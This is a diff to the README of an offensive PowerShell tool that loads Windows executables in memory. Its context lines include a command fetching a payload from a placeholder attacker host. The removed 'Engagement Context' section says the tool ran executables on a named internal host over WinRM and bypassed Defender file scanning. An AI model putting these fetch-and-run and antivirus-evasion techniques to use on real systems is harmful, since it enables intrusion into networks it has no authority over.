@@ -110,10 +110,6 @@ Invoke-PELoader -PEData $bytes -CmdLine "app.exe -f chrome"
 .\peloader.ps1 -Url http://ATTACKER/payload.b64 -Arguments "-f chrome" -ExeName "tool.exe"
 ```
 
-## Engagement Context
-
-Developed for cl-2 to run executables on MGMT01 (10.1.123.40) via WinRM without touching disk (bypassing Defender file scanning). The `ExitProcess → ExitThread` IAT hook prevents the loaded PE from killing the WinRM host process (wsmprovhost.exe).
-
 ## Limitations
 
 - PE64 only (PE32 not supported)
